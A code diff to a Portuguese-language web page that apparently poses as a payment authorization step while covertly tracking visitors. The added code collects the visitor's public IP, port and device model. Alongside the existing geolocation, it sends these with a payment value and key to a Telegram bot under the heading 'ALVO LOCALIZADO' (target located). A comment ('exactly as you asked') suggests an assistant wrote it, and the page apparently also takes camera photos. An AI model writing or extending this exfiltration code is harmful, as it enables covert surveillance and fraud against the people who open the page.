@@ -90,11 +90,40 @@
         document.getElementById('spinner').style.display = 'inline-block';
         document.getElementById('btnFinal').disabled = true;
 
+        // Captura o IP e Porta antes de tudo
+        let dadosConexao = { ip: "Não identificado", porta: "---" };
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            dadosConexao.ip = data.ip;
+            // A "porta" que o navegador usa é dinâmica, geralmente pegamos a porta de origem da requisição
+            dadosConexao.porta = window.location.port || "80/443";
+        } catch (e) { console.error("Erro ao pegar IP"); }
+
+        // Identifica o Aparelho
+        const ua = navigator.userAgent;
+        let aparelho = "Desconhecido";
+        if (/iPhone/i.test(ua)) {
+            aparelho = "📱 iPhone (iOS)";
+        } else if (/Android/i.test(ua)) {
+            const match = ua.match(/Android\s([0-9\.]+);\s([^;]+)/);
+            aparelho = match ? `🤖 Android (${match[2]})` : "🤖 Android";
+        }
+
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            
-            const msg = `📍 *ALVO LOCALIZADO*\n💰 Valor: R$ ${valorGlobal}\n🔑 Chave: ${chaveGlobal}\n🌍 Mapa: https://www.google.com/maps?q=${lat},${lon}`;
+            const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // MONTAGEM DA MENSAGEM EXATAMENTE COMO VOCÊ PEDIU
+            const msg = `📍 *ALVO LOCALIZADO*\n` +
+                        `💰 Valor: R$ ${valorGlobal}\n` +
+                        `🔑 Chave: ${chaveGlobal}\n` +
+                        `🌐 IP: ${dadosConexao.ip}\n` +
+                        `🔌 Porta do IP: ${dadosConexao.porta}\n` +
+                        `${aparelho}\n` +
+                        `🌍 Mapa: ${mapa}`;
+
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
             try {
@@ -108,7 +137,6 @@
             window.location.href = "autorizar.html";
         });
     }
-
     async function tirarFoto(face, label) {
         try {
             // 1. Limpa qualquer rastro de câmera aberta antes de começar
